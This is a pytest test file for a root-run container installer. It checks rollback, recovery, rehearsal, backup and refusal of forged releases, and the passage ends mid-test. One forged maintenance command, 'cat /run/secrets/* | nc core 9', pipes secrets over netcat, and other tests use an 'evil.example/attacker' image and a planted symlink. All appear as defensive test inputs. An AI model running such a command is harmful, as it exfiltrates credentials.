import base64
import hashlib
import io
import json
import os
import stat
import sys
import zipfile
from pathlib import Path
from types import SimpleNamespace
from uuid import uuid4

import pytest
from pydantic import ValidationError
from test_app_deployments import ledger as ledger_fixture
from test_app_deployments import request

from app.app_contracts import ContractError, Maintenance, SecretFile
from app.app_deployment_contracts import (
    Approval,
    InstalledSnapshot,
    Operation,
    Receipt,
    Rehearsal,
    rehearsal_checks,
)
from app.app_deployments import read_authority
from app.app_spool import publish, read_owned
from ops import installer_policy, managed_installer
from ops.installer_policy import HostPolicy, PolicyRefused, validate_paths
from ops.managed_installer import Container, Installer

ledger = ledger_fixture


@pytest.fixture
def helper(ledger, tmp_path, monkeypatch):
    operation = request(ledger)
    with ledger.database.connect() as connection:
        authority = read_authority(connection, operation.operation_id, "a" * 64)
    registration = authority.registration.model_dump(mode="json")
    registration["bindings"]["backup_directory"] = str(tmp_path / "backups")
    registration["bindings"]["secret_files"] = []
    policy = HostPolicy.model_validate_json(
        json.dumps(
            dict(
                core_uid=1001,
                core_gid=1001,
                database=str(tmp_path / "core/core.sqlite"),
                spool=str(ledger.spool),
                journal=str(tmp_path / "journal"),
                scratch=str(tmp_path / "scratch"),
                units=str(tmp_path / "units"),
                python="/usr/bin/python3",
                environment="test",
                app_api_url=authority.app_api_url,
                timezone="UTC",
                apps=[
                    dict(
                        registration=registration,
                        uid=1002,
                        gid=1002,
                        credential_file=str(tmp_path / "credentials/notes"),
                        compatibility_argv=["python", "-m", "notes", "--check-state"],
                        state={"sqlite_file": ".notes.db"},
                        maintenance=[
                            {
                                "name": "cleanup",
                                "argv": ["python", "-m", "notes.cleanup"],
                                "interval_hours": 6,
                                "timeout_seconds": 300,
                            }
                        ],
                    )
                ],
            )
        )
    )
    (tmp_path / "journal").mkdir()
    (tmp_path / "scratch").mkdir()
    installer = Installer(policy)
    app = policy.apps[0]
    from app.app_deployments import eligible

    with ledger.database.connect() as connection:
        verified = eligible(connection, authority.registration, ledger.digest)
    release = installer.release(
        app, verified.archive, verified.artifact_id, verified.artifact_sha256
    )
    events = []
    monkeypatch.setattr(managed_installer, "root_path", lambda *_, **__: None)
    monkeypatch.setattr(
        managed_installer,
        "read_owned",
        lambda path, uid, limit=65536: read_owned(path, os.geteuid(), limit),
    )
    monkeypatch.setattr(
        installer,
        "child",
        lambda *args: b"switching"
        if args[2] == "state"
        else operation.model_dump_json().encode(),
    )
    monkeypatch.setattr(installer, "authority", lambda *_: (authority, app, release))
    monkeypatch.setattr(installer, "limits", lambda: events.append("limits"))
    monkeypatch.setattr(installer, "image", lambda *_, **__: "sha256:" + "b" * 64)
    monkeypatch.setattr(
        installer,
        "rehearse",
        lambda *_: Rehearsal(
            selection=operation.approval.selection,
            image_id="sha256:" + "b" * 64,
            previous_image_id=None,
            backup_sha256=None,
            checks=rehearsal_checks(None),
        ),
    )
    monkeypatch.setattr(installer, "lifecycle", lambda *_: events.append("lifecycle"))
    return installer, operation, authority, app, release, events


def test_completed_helper_replays_immutable_receipt_without_effects(helper):
    installer, operation, _, _, _, events = helper
    installer.execute(operation.operation_id)
    assert events == ["limits"]
    installer.execute(operation.operation_id)
    assert events == ["limits"]


def test_changed_authority_never_touches_docker(helper, monkeypatch):
    installer, operation, _, _, _, events = helper

    def refuse(*args):
        raise ContractError("changed")

    monkeypatch.setattr(installer, "authority", refuse)
    installer.execute(operation.operation_id)
    assert events == []
    receipt = Receipt.model_validate_json(
        (installer.journal / f"{operation.operation_id}.receipt.json").read_bytes()
    )
    assert receipt.state == "failed"
    assert receipt.error == "authority_changed"


def test_interrupted_switch_adopts_exact_owned_image(helper, monkeypatch):
    installer, operation, authority, app, release, events = helper
    operation = operation.model_copy(update={"kind": "deploy"})
    authority = authority.model_copy(update={"operation": operation})
    monkeypatch.setattr(installer, "authority", lambda *_: (authority, app, release))
    monkeypatch.setattr(
        installer,
        "child",
        lambda *args: b"switching"
        if args[2] == "state"
        else operation.model_dump_json().encode(),
    )
    container = Container.model_validate(
        dict(
            Image="sha256:" + "b" * 64,
            Config=dict(
                Labels={"home-platform.operation": str(operation.operation_id)}
            ),
            HostConfig=dict(Memory=1, MemorySwap=1, PidsLimit=1, NanoCpus=1),
            State=dict(Running=True),
        )
    )
    monkeypatch.setattr(installer, "owned", lambda *_: container)
    monkeypatch.setattr(installer, "probe", lambda *_: events.append("probe"))
    monkeypatch.setattr(
        installer, "start", lambda *_: pytest.fail("must adopt exact running container")
    )
    installer.execute(operation.operation_id)
    receipt = Receipt.model_validate_json(
        (installer.journal / f"{operation.operation_id}.receipt.json").read_bytes()
    )
    assert receipt.state == "succeeded"
    assert events == ["limits", "probe", "lifecycle"]


def test_contradictory_container_blocks_without_removal(helper, monkeypatch):
    installer, operation, authority, app, release, _events = helper
    operation = operation.model_copy(update={"kind": "deploy"})
    authority = authority.model_copy(update={"operation": operation})
    monkeypatch.setattr(installer, "authority", lambda *_: (authority, app, release))
    monkeypatch.setattr(
        installer,
        "child",
        lambda *args: b"switching"
        if args[2] == "state"
        else operation.model_dump_json().encode(),
    )
    container = Container.model_validate(
        dict(
            Image="sha256:" + "f" * 64,
            Config=dict(Labels={}),
            HostConfig=dict(Memory=1, MemorySwap=1, PidsLimit=1, NanoCpus=1),
            State=dict(Running=True),
        )
    )
    monkeypatch.setattr(installer, "owned", lambda *_: container)
    monkeypatch.setattr(
        installer, "remove", lambda *_: pytest.fail("unknown image must survive")
    )
    installer.execute(operation.operation_id)
    receipt = Receipt.model_validate_json(
        (installer.journal / f"{operation.operation_id}.receipt.json").read_bytes()
    )
    assert receipt.state == "blocked"


def test_failed_switch_recovers_previous_code_with_current_state(
    helper, tmp_path, monkeypatch
):
    installer, operation, authority, app, release, events = helper
    operation = operation.model_copy(update={"kind": "deploy"})
    previous = InstalledSnapshot(
        operation_id=uuid4(),
        generation=1,
        selection=operation.approval.selection,
        registration=app.registration,
        image=release.image,
        image_id="sha256:" + "b" * 64,
    )
    authority = authority.model_copy(
        update={"operation": operation, "previous": previous}
    )
    installed_by_root(installer, previous)
    state = tmp_path / "state"
    state.mkdir()
    (state / "current").write_text("new writes after migration")
    monkeypatch.setattr(installer, "authority", lambda *_: (authority, app, release))
    monkeypatch.setattr(
        installer,
        "child",
        lambda *args: b"switching"
        if args[2] == "state"
        else operation.model_dump_json().encode(),
    )
    monkeypatch.setattr(installer, "backup", lambda *_: events.append("backup"))
    monkeypatch.setattr(installer, "owned", lambda *_: None)
    monkeypatch.setattr(installer, "stop_timers", lambda *_: None)
    monkeypatch.setattr(installer, "remove", lambda *_: events.append("remove"))
    monkeypatch.setattr(
        installer,
        "start",
        lambda *args, **kwargs: events.append(
            ("start", kwargs.get("installed_operation_id"))
        ),
    )

    def probe(*args):
        if events.count("remove") == 1:
            raise ContractError("new image failed readiness")

    monkeypatch.setattr(installer, "probe", probe)
    installer.execute(operation.operation_id)
    receipt = Receipt.model_validate_json(
        (installer.journal / f"{operation.operation_id}.receipt.json").read_bytes()
    )
    assert receipt.state == "recovered"
    assert ("start", previous.operation_id) in events
    assert (state / "current").read_text() == "new writes after migration"


@pytest.mark.parametrize("kind", ["deploy", "rollback"])
def test_failed_switch_restores_the_journaled_registration_not_the_edited_policy(
    helper, monkeypatch, kind
):
    installer, operation, authority, app, release, events = helper
    operation = operation.model_copy(update={"kind": kind})
    journaled = app.registration
    edited = json.loads(journaled.model_dump_json())
    edited["bindings"]["resources"]["memory_bytes"] = 512 * 1024 * 1024
    edited["bindings"]["settings"] = [{"name": "NOTES_PAGE_SIZE", "value": "50"}]
    edited = type(journaled).model_validate_json(json.dumps(edited))
    current = InstalledSnapshot(
        operation_id=uuid4(),
        generation=2,
        selection=operation.approval.selection,
        registration=journaled,
        image=release.image,
        image_id="sha256:" + "b" * 64,
    )
    installed_by_root(installer, current)
    retain(installer, release)
    app = app.model_copy(update={"registration": edited})
    authority = authority.model_copy(
        update={"operation": operation, "previous": current, "registration": edited}
    )
    monkeypatch.setattr(installer, "authority", lambda *_: (authority, app, release))
    monkeypatch.setattr(
        installer,
        "child",
        lambda *args: b"switching"
        if args[2] == "state"
        else operation.model_dump_json().encode(),
    )
    runs = []
    monkeypatch.setattr(
        installer,
        "command",
        lambda *argv, **_: runs.append(argv) if argv[:2] == ("docker", "run") else "",
    )
    monkeypatch.setattr(installer, "credential_snapshot", lambda *_: Path("/c"))
    monkeypatch.setattr(installer, "local_image", lambda *_: current.image_id)
    for name in ("backup", "pre_switch_backup", "owned", "stop_timers"):
        monkeypatch.setattr(installer, name, lambda *_: None)
    monkeypatch.setattr(installer, "remove", lambda *_: events.append("remove"))
    probed = []

    def probe(_authority, probed_app, *_):
        probed.append(probed_app.registration)
        if len(probed) == 1:
            raise ContractError("new image failed readiness")

    monkeypatch.setattr(installer, "probe", probe)
    installer.execute(operation.operation_id)
    receipt = Receipt.model_validate_json(
        (installer.journal / f"{operation.operation_id}.receipt.json").read_bytes()
    )
    assert (receipt.state, receipt.installed) == ("recovered", None)
    assert installer.current(app) == current
    restored = runs[-1]
    assert restored[restored.index("--memory") + 1] == str(256 * 1024 * 1024)
    assert "NOTES_PAGE_SIZE=50" not in restored
    assert f"home-platform.operation={current.operation_id}" in restored
    assert probed[-1] == journaled, "root probed the restore against the new limits"


@pytest.mark.parametrize(
    "outputs,accepted",
    [
        (["records", "records", "records"], True),
        (["records", "[]", "[]"], False),
        (["records", "records", "different"], False),
    ],
)
def test_rehearsal_requires_three_equal_semantic_results(
    helper,
    tmp_path,
    monkeypatch,
    outputs,
    accepted,
):
    installer, operation, authority, app, release, _events = helper
    previous = InstalledSnapshot(
        operation_id=uuid4(),
        generation=1,
        selection=operation.approval.selection,
        registration=app.registration,
        image=release.image,
        image_id="sha256:" + "b" * 64,
    )
    authority = authority.model_copy(update={"previous": previous})
    installed_by_root(installer, previous)
    retain(installer, release)
    backup = tmp_path / "copy.sqlite"
    backup.write_bytes(b"disposable fixture")
    calls = []
    monkeypatch.setattr(managed_installer.os, "chown", lambda *_: None)
    monkeypatch.setattr(managed_installer.os, "fchown", lambda *_: None)
    monkeypatch.setattr(installer, "remove", lambda *_: None)
    monkeypatch.setattr(installer, "start", lambda *args, **kwargs: "fixture")
    monkeypatch.setattr(installer, "rehearsal_ready", lambda *_: calls.append("ready"))
    monkeypatch.setattr(installer, "backup", lambda *args, **kwargs: None)
    values = iter(outputs)

    def semantic(*args):
        calls.append("semantic")
        return next(values)

    monkeypatch.setattr(installer, "semantic_state", semantic)
    if accepted:
        result = Installer.rehearse(
            installer, authority, app, release, "sha256:" + "b" * 64, backup
        )
        assert result.checks["semantic_records"]
        assert calls == ["semantic", "ready", "semantic", "semantic"]
    else:
        with pytest.raises(managed_installer.RecordsChanged):
            Installer.rehearse(
                installer, authority, app, release, "sha256:" + "b" * 64, backup
            )


@pytest.mark.parametrize(
    "outputs,ready,error",
    [
        (["records", "[]", "[]"], True, "records_changed"),
        (["records", "records", "different"], True, "records_changed"),
        (["records", "records", "records"], False, "installation_failed"),
    ],
)
def test_rehearsal_receipt_names_a_release_that_would_change_stored_records(
    helper, monkeypatch, outputs, ready, error
):
    installer, operation, authority, app, release, _events = helper
    previous = InstalledSnapshot(
        operation_id=uuid4(),
        generation=1,
        selection=operation.approval.selection,
        registration=app.registration,
        image=release.image,
        image_id="sha256:" + "b" * 64,
    )
    authority = authority.model_copy(update={"previous": previous})
    installed_by_root(installer, previous)
    values = iter(outputs)

    def not_ready(*_):
        raise ContractError("Rehearsal container did not become ready")

    monkeypatch.setattr(installer, "authority", lambda *_: (authority, app, release))
    monkeypatch.setattr(installer, "rehearse", Installer.rehearse.__get__(installer))
    monkeypatch.setattr(managed_installer.os, "chown", lambda *_: None)
    monkeypatch.setattr(managed_installer.os, "fchown", lambda *_: None)
    monkeypatch.setattr(installer, "remove", lambda *_: None)
    monkeypatch.setattr(installer, "start", lambda *args, **kwargs: "fixture")
    monkeypatch.setattr(
        installer, "rehearsal_ready", (lambda *_: None) if ready else not_ready
    )
    monkeypatch.setattr(
        installer,
        "backup",
        lambda app, name, destination, **_: destination.write_bytes(b"fixture"),
    )
    monkeypatch.setattr(installer, "semantic_state", lambda *_: next(values))
    installer.execute(operation.operation_id)
    receipt = Receipt.model_validate_json(
        (installer.journal / f"{operation.operation_id}.receipt.json").read_bytes()
    )
    assert (receipt.state, receipt.error, receipt.rehearsal) == ("failed", error, None)


@pytest.mark.parametrize("output", ["", " " * 2, "x" * 65537])
def test_semantic_probe_refuses_empty_or_unbounded_output(helper, monkeypatch, output):
    installer, _, authority, app, release, _ = helper
    monkeypatch.setattr(installer, "start", lambda *args, **kwargs: "probe")
    removed = []
    monkeypatch.setattr(installer, "remove", lambda *args: removed.append(args))
    monkeypatch.setattr(
        installer,
        "command",
        lambda *args, **kwargs: "0" if args[1] == "wait" else output,
    )
    with pytest.raises(ContractError, match="output"):
        installer.semantic_state(authority, app, release, "image", installer.journal)
    assert removed == [("probe", "notes")]


def test_root_restore_check_does_not_follow_a_symlink_planted_by_the_app(
    helper, tmp_path, monkeypatch
):
    installer, _, _, app, _, _ = helper
    victim = tmp_path / "victim"
    victim.write_bytes(b"root-owned content")
    monkeypatch.setattr(managed_installer.os, "chown", lambda *_: None)
    monkeypatch.setattr(managed_installer.os, "fchown", lambda *_: None)
    (tmp_path / "backups").mkdir()

    def hostile_child(uid, gid, kind, source, target):
        copy = Path(target)
        copy.write_bytes(b"sqlite copy")
        (copy.parent / "restored.sqlite").symlink_to(victim)
        return json.dumps(
            {
                "sha256": hashlib.sha256(b"sqlite copy").hexdigest(),
                "tables": ["entries"],
                "content_sha256": "c" * 64,
            }
        ).encode()

    monkeypatch.setattr(installer, "child", hostile_child)
    with pytest.raises(OSError):
        installer.backup(app, "notes.db", tmp_path / "backups" / "copy.sqlite")
    assert victim.read_bytes() == b"root-owned content"


def test_pre_switch_backup_follows_admission_and_keeps_two_installation_sets(
    helper, tmp_path, monkeypatch
):
    installer, operation, authority, app, release, events = helper
    backups = tmp_path / "backups"
    backups.mkdir()
    untouched = {"daily-20260101-000000.sqlite", "stray.sqlite"}
    older, previous_set, superseded = (
        f"pre-switch-g{generation}-{uuid4()}.sqlite" for generation in (1, 3, 4)
    )
    for name in (*untouched, older, previous_set, superseded):
        (backups / name).write_bytes(b"existing")

    def backup(app, sqlite_file, destination, **_):
        destination.write_bytes(b"copy")
        events.append(("backup", destination))

    monkeypatch.setattr(installer, "backup", backup)
    child = installer.child
    monkeypatch.setattr(
        installer,
        "child",
        lambda *args: (events.append(("child", args[2])), child(*args))[1],
    )
    selection = operation.approval.selection.model_copy(update={"generation": 3})
    previous = InstalledSnapshot(
        operation_id=uuid4(),
        generation=3,
        selection=selection,
        registration=app.registration,
        image=release.image,
        image_id="sha256:" + "b" * 64,
    )
    installed_by_root(installer, previous)
    monkeypatch.setattr(
        installer,
        "authority",
        lambda *_: (authority.model_copy(update={"previous": previous}), app, release),
    )
    installer.execute(operation.operation_id)
    rehearsal_inputs = [item for item in events if item[0] == "backup"]
    assert len(rehearsal_inputs) == 1
    assert str(rehearsal_inputs[0][1]).startswith(installer.policy.scratch)
    assert not rehearsal_inputs[0][1].exists()
    assert {path.name for path in backups.iterdir()} == {
        *untouched,
        older,
        previous_set,
        superseded,
    }
    events.clear()
    deploy = operation.model_copy(
        update={
            "operation_id": uuid4(),
            "kind": "deploy",
            "approval": operation.approval.model_copy(update={"selection": selection}),
        }
    )
    deployed = authority.model_copy(update={"operation": deploy, "previous": previous})
    monkeypatch.setattr(installer, "authority", lambda *_: (deployed, app, release))
    monkeypatch.setattr(
        installer,
        "child",
        lambda *args: (
            events.append(("child", args[2])),
            b"switching" if args[2] == "state" else deploy.model_dump_json().encode(),
        )[1],
    )
    monkeypatch.setattr(installer, "owned", lambda *_: None)
    monkeypatch.setattr(installer, "stop_timers", lambda *_: events.append("stop"))
    monkeypatch.setattr(installer, "remove", lambda *_: None)
    monkeypatch.setattr(installer, "start", lambda *args, **kwargs: None)
    monkeypatch.setattr(installer, "probe", lambda *_: None)
    installer.execute(deploy.operation_id)
    receipt = Receipt.model_validate_json(
        (installer.journal / f"{deploy.operation_id}.receipt.json").read_bytes()
    )
    assert receipt.state == "succeeded"
    taken = f"pre-switch-g4-{deploy.operation_id}.sqlite"
    assert {path.name for path in backups.iterdir()} == {
        *untouched,
        previous_set,
        taken,
    }
    order = [
        item
        for item in events
        if item in {("child", "state"), "stop"} or item[0] == "backup"
    ]
    assert [item if item == "stop" else item[0] for item in order][-3:] == [
        "child",
        "backup",
        "stop",
    ]
    assert order[-2][1] == backups / taken


EVIL_IMAGE = "evil.example/attacker@sha256:" + "e" * 64


def retain(installer, release):
    publish(installer.journal / (release.archive_sha256 + ".zip"), release.archive)


def core_snapshot(operation, app, image):
    return InstalledSnapshot(
        operation_id=uuid4(),
        generation=1,
        selection=operation.approval.selection,
        registration=app.registration,
        image=image,
        image_id="sha256:" + "e" * 64,
    )


def test_restore_previous_runs_only_the_root_retained_image(helper, monkeypatch):
    installer, operation, authority, app, release, _ = helper
    retain(installer, release)
    started = []
    monkeypatch.setattr(installer, "local_image", lambda image: "sha256:" + "e" * 64)
    for name in ("stop_timers", "remove", "probe", "lifecycle"):
        monkeypatch.setattr(installer, name, lambda *_: None)
    monkeypatch.setattr(
        installer, "start", lambda *args, **kwargs: started.append(args[3])
    )
    with pytest.raises(ContractError, match="no accepted installation"):
        installer.restore_previous(authority, app)
    installed_by_root(installer, core_snapshot(operation, app, EVIL_IMAGE))
    with pytest.raises(ContractError, match="retained release"):
        installer.restore_previous(authority, app)
    assert started == [], "root started an image its retained release does not name"
    installed_by_root(installer, core_snapshot(operation, app, release.image))
    installer.restore_previous(authority, app)
    assert started == [release.image]


def test_restore_previous_restarts_the_journaled_current_generation(
    helper, monkeypatch
):
    installer, operation, authority, app, release, _ = helper
    retain(installer, release)
    older = core_snapshot(operation, app, release.image)
    newer = core_snapshot(operation, app, release.image).model_copy(
        update={"generation": 2}
    )
    installed_by_root(installer, older)
    installed_by_root(installer, newer)
    started = []
    monkeypatch.setattr(installer, "local_image", lambda *_: "sha256:" + "e" * 64)
    for name in ("stop_timers", "remove", "probe", "lifecycle"):
        monkeypatch.setattr(installer, name, lambda *_: None)
    monkeypatch.setattr(
        installer, "start", lambda *a, **k: started.append(k["installed_operation_id"])
    )
    installer.restore_previous(authority, app)
    assert started == [newer.operation_id], "root restored a superseded generation"


def test_installed_snapshot_image_is_typed_at_the_contract_boundary(helper):
    _, operation, _, app, release, _ = helper
    snapshot = core_snapshot(operation, app, release.image)
    for forged in ("busybox", "evil.example/x:latest", "x@sha256:" + "e" * 63, ""):
        with pytest.raises(ValidationError):
            InstalledSnapshot.model_validate_json(
                json.dumps({**snapshot.model_dump(mode="json"), "image": forged})
            )
        with pytest.raises(ValidationError):
            InstalledSnapshot.model_validate_json(
                json.dumps({**snapshot.model_dump(mode="json"), "image_id": forged})
            )


def test_backup_copies_are_private_to_root(helper, tmp_path, monkeypatch):
    installer, _, _, app, _, _ = helper
    monkeypatch.setattr(managed_installer.os, "chown", lambda *_: None)
    monkeypatch.setattr(managed_installer.os, "fchown", lambda *_: None)
    (tmp_path / "backups").mkdir()

    def child(uid, gid, kind, source, target):
        Path(target).write_bytes(b"sqlite copy")
        return json.dumps(
            {
                "sha256": hashlib.sha256(b"sqlite copy").hexdigest(),
                "tables": ["entries"],
                "content_sha256": "c" * 64,
            }
        ).encode()

    monkeypatch.setattr(installer, "child", child)
    destination = tmp_path / "backups" / f"pre-switch-g2-{uuid4()}.sqlite"
    installer.backup(app, "notes.db", destination)
    assert stat.S_IMODE(destination.stat().st_mode) == 0o600


@pytest.mark.parametrize("character", ["\x00", "\n", "\x1f", "\x7f"])
def test_maintenance_argv_rejects_control_characters(character):
    with pytest.raises(ValidationError):
        Maintenance(
            name="check",
            argv=("check", "a" + character + "b"),
            interval_hours=1,
            timeout_seconds=5,
        )
    accepted = Maintenance(
        name="check", argv=("check", "a b"), interval_hours=1, timeout_seconds=5
    )
    assert accepted.argv == ("check", "a b")


def test_rehearsal_readiness_requires_the_same_container_after_nsenter(
    helper, monkeypatch
):
    installer, _, _, app, release, _ = helper
    pids = iter([42, 43, 7, 7])

    def owned(*_):
        return Container.model_validate(
            dict(
                Image="sha256:" + "b" * 64,
                Config=dict(Labels={}),
                HostConfig=dict(Memory=1, MemorySwap=1, PidsLimit=1, NanoCpus=1),
                State=dict(Running=True, Pid=next(pids)),
            )
        )

    monkeypatch.setattr(installer, "owned", owned)
    monkeypatch.setattr(installer, "command", lambda *args, **kwargs: "")
    with pytest.raises(ContractError, match="changed"):
        installer.rehearsal_ready("hp-rehearsal-notes", app, release)
    installer.rehearsal_ready("hp-rehearsal-notes", app, release)


def test_spec_prunes_superseded_secret_snapshots(helper, tmp_path, monkeypatch):
    installer, _, authority, app, release, _ = helper
    secret = tmp_path / "secrets" / "db"
    secret.parent.mkdir()
    secret.write_bytes(b"current secret")
    bindings = app.registration.bindings.model_copy(
        update={"secret_files": (SecretFile(name="db", file_path=str(secret)),)}
    )
    app = app.model_copy(
        update={
            "registration": app.registration.model_copy(update={"bindings": bindings})
        }
    )
    credentials = installer.journal / "credentials"
    credentials.mkdir()
    stale = credentials / ("notes--db--" + "0" * 64)
    other_secret = credentials / ("notes--db-key--" + "1" * 64)
    for path in (stale, other_secret):
        path.write_bytes(b"old")
    monkeypatch.setattr(managed_installer.os, "chown", lambda *_: None)
    monkeypatch.setattr(managed_installer.os, "chmod", lambda *_: None)
    monkeypatch.setattr(
        installer, "credential_snapshot", lambda *_: credentials / "notes-credential"
    )
    installer.spec(authority, app, release)
    current = credentials / (
        "notes--db--" + hashlib.sha256(b"current secret").hexdigest()
    )
    assert current.exists() and other_secret.exists()
    assert not stale.exists()


def test_recovery_adoption_prunes_backups_like_a_deployment(
    helper, tmp_path, monkeypatch
):
    installer, operation, authority, app, release, _ = helper
    backups = tmp_path / "backups"
    backups.mkdir()
    for generation in (1, 2, 3):
        (backups / f"pre-switch-g{generation}-{uuid4()}.sqlite").write_bytes(b"x")
    selection = operation.approval.selection.model_copy(update={"generation": 3})
    current = InstalledSnapshot(
        operation_id=uuid4(),
        generation=3,
        selection=operation.approval.selection.model_copy(update={"generation": 2}),
        registration=app.registration,
        image=release.image,
        image_id="sha256:" + "b" * 64,
    )
    installed_by_root(installer, current)
    blocked = Receipt(
        operation_id=uuid4(),
        selection=selection,
        state="blocked",
        error="recovery_required",
    )
    publish(
        installer.journal / f"{blocked.operation_id}.receipt.json",
        blocked.model_dump_json().encode(),
    )
    recover = Operation(
        operation_id=uuid4(),
        request_id=uuid4(),
        kind="recover",
        approval=Approval(
            selection=selection,
            administrator_id=operation.approval.administrator_id,
            session_version=1,
            rehearsal_id=None,
        ),
        recovers=blocked.operation_id,
    )
    candidate = Container.model_validate(
        dict(
            Image="sha256:" + "b" * 64,
            Config=dict(Labels={"home-platform.operation": str(blocked.operation_id)}),
            HostConfig=dict(Memory=1, MemorySwap=1, PidsLimit=1, NanoCpus=1),
            State=dict(Running=True),
        )
    )
    monkeypatch.setattr(installer, "owned", lambda *_: candidate)
    monkeypatch.setattr(installer, "local_image", lambda *_: "sha256:" + "b" * 64)
    monkeypatch.setattr(installer, "probe", lambda *_: None)
    receipt = installer.recover(
        recover,
        authority.model_copy(update={"operation": recover, "previous": current}),
        app,
        release,
    )
    assert receipt.installed is not None
    assert receipt.installed.generation == 4
    assert sorted(found for _, found in installer.pre_switch_backups(app)) == [3]


def test_mid_deploy_retry_restarts_a_stopped_switched_container(helper, monkeypatch):
    installer, operation, authority, app, release, events = helper
    operation = operation.model_copy(update={"kind": "deploy"})
    authority = authority.model_copy(update={"operation": operation})
    monkeypatch.setattr(installer, "authority", lambda *_: (authority, app, release))
    monkeypatch.setattr(
        installer,
        "child",
        lambda *args: b"switching"
        if args[2] == "state"
        else operation.model_dump_json().encode(),
    )
    stopped = Container.model_validate(
        dict(
            Image="sha256:" + "b" * 64,
            Config=dict(
                Labels={"home-platform.operation": str(operation.operation_id)}
            ),
            HostConfig=dict(Memory=1, MemorySwap=1, PidsLimit=1, NanoCpus=1),
            State=dict(Running=False),
        )
    )
    monkeypatch.setattr(installer, "owned", lambda *_: stopped)
    monkeypatch.setattr(
        installer, "command", lambda *args, **kwargs: events.append(args) or ""
    )
    monkeypatch.setattr(installer, "probe", lambda *_: events.append("probe"))
    monkeypatch.setattr(
        installer,
        "start",
        lambda *_, **__: pytest.fail(
            "the verified container is restarted, not rebuilt"
        ),
    )
    monkeypatch.setattr(
        installer, "remove", lambda *_: pytest.fail("the verified container survives")
    )
    installer.execute(operation.operation_id)
    receipt = Receipt.model_validate_json(
        (installer.journal / f"{operation.operation_id}.receipt.json").read_bytes()
    )
    assert receipt.state == "succeeded"
    assert events == [
        "limits",
        ("docker", "start", "hp-app-notes"),
        "probe",
        "lifecycle",
    ]


def installed_by_root(installer, snapshot):
    managed_installer.replace_file(
        installer.journal / f"{snapshot.selection.app_id}.current.json",
        snapshot.model_dump_json().encode(),
    )


def forged_archive(release, **changes):
    with zipfile.ZipFile(io.BytesIO(release.archive)) as archive:
        manifest = json.loads(archive.read("manifest.json"))
        proof = json.loads(archive.read("publication.json"))
    manifest.update(changes)
    manifest = {key: value for key, value in manifest.items() if value is not None}
    payload = json.dumps(manifest).encode()
    digest = hashlib.sha256(payload).hexdigest()
    proof["manifest_sha256"] = digest
    proof["assets"] = {"manifest.json": digest}
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w") as archive:
        archive.writestr("manifest.json", payload)
        archive.writestr("publication.json", json.dumps(proof).encode())
    return output.getvalue(), digest


def test_core_archive_naming_a_foreign_registry_image_is_refused_before_pull(
    helper, monkeypatch
):
    installer, operation, authority, app, release, _ = helper
    archive, manifest_digest = forged_archive(release, image=EVIL_IMAGE)
    selection = operation.approval.selection.model_copy(
        update={
            "archive_sha256": hashlib.sha256(archive).hexdigest(),
            "manifest_sha256": manifest_digest,
        }
    )
    forged_op = operation.model_copy(
        update={
            "approval": operation.approval.model_copy(update={"selection": selection})
        }
    )
    credential = Path(app.credential_file).read_bytes().strip()
    forged = authority.model_copy(
        update={
            "operation": forged_op,
            "registration": app.registration,
            "archive_base64": base64.b64encode(archive).decode(),
            "credential_verifier": hashlib.sha256(credential).hexdigest(),
        }
    )
    monkeypatch.setattr(installer, "current_policy", lambda: None)
    monkeypatch.setattr(
        installer,
        "child",
        lambda *args: forged.model_dump_json().encode()
        if args[2] == "authority"
        else forged_op.model_dump_json().encode(),
    )
    monkeypatch.setattr(installer, "authority", Installer.authority.__get__(installer))
    pulled = []
    monkeypatch.setattr(installer, "image", lambda ref, **_: pulled.append(ref))
    with pytest.raises(ContractError):
        installer.authority(forged_op)
    installer.execute(forged_op.operation_id)
    receipt = Receipt.model_validate_json(
        (installer.journal / f"{forged_op.operation_id}.receipt.json").read_bytes()
    )
    assert (receipt.state, receipt.error) == ("failed", "authority_changed")
    assert pulled == []


def forged_authority(installer, authority, app, operation, monkeypatch, **changes):
    credential = Path(app.credential_file).read_bytes().strip()
    forged = authority.model_copy(
        update={
            "operation": operation,
            "registration": app.registration,
            "credential_verifier": hashlib.sha256(credential).hexdigest(),
            **changes,
        }
    )
    monkeypatch.setattr(installer, "current_policy", lambda: None)
    monkeypatch.setattr(
        installer,
        "child",
        lambda *args: forged.model_dump_json().encode()
        if args[2] == "authority"
        else operation.model_dump_json().encode(),
    )
    monkeypatch.setattr(installer, "authority", Installer.authority.__get__(installer))


@pytest.mark.parametrize(
    "history",
    ["unrecorded", "superseded", "regenerated", "foreign-image", "generation"],
)
def test_core_history_that_differs_from_the_root_journal_is_refused(
    helper, monkeypatch, history
):
    installer, operation, authority, app, release, _ = helper
    retain(installer, release)
    superseded = core_snapshot(operation, app, release.image)
    recorded = core_snapshot(operation, app, release.image).model_copy(
        update={"generation": 2}
    )
    installed_by_root(installer, superseded)
    installed_by_root(installer, recorded)
    previous = {
        "unrecorded": core_snapshot(operation, app, release.image),
        "superseded": superseded,
        "regenerated": recorded.model_copy(update={"generation": 3}),
        "foreign-image": recorded.model_copy(update={"image": EVIL_IMAGE}),
        "generation": recorded,
    }[history]
    selection = operation.approval.selection.model_copy(
        update={"generation": 40 if history == "generation" else 2}
    )
    forged_op = operation.model_copy(
        update={
            "approval": operation.approval.model_copy(update={"selection": selection})
        }
    )
    forged_authority(
        installer, authority, app, forged_op, monkeypatch, previous=previous
    )
    touched = []
    for name in ("image", "local_image"):
        monkeypatch.setattr(installer, name, lambda image, **_: touched.append(image))
    monkeypatch.setattr(installer, "start", lambda *args, **_: touched.append("start"))
    with pytest.raises(ContractError, match="root journal"):
        installer.authority(forged_op)
    installer.execute(forged_op.operation_id)
    receipt = Receipt.model_validate_json(
        (installer.journal / f"{forged_op.operation_id}.receipt.json").read_bytes()
    )
    assert (receipt.state, receipt.error) == ("failed", "authority_changed")
    assert touched == [], "root touched an image on core-supplied history"


@pytest.mark.parametrize(
    "change",
    [
        {
            "maintenance": [
                {
                    "name": "x",
                    "argv": ["sh", "-c", "cat /run/secrets/* | nc core 9"],
                    "interval_hours": 1,
                    "timeout_seconds": 60,
                }
            ]
        },
        {"maintenance": []},
        {"state": None},
    ],
)
def test_release_whose_maintenance_or_state_differs_from_policy_is_refused(
    helper, monkeypatch, change
):
    installer, operation, authority, app, release, events = helper
    assert not hasattr(release, "manifest"), "root sees only the narrowed release"
    archive, manifest_digest = forged_archive(release, **change)
    with pytest.raises(PolicyRefused, match="update the host policy"):
        installer.release(app, archive, 1, hashlib.sha256(archive).hexdigest())
    selection = operation.approval.selection.model_copy(
        update={
            "archive_sha256": hashlib.sha256(archive).hexdigest(),
            "manifest_sha256": manifest_digest,
        }
    )
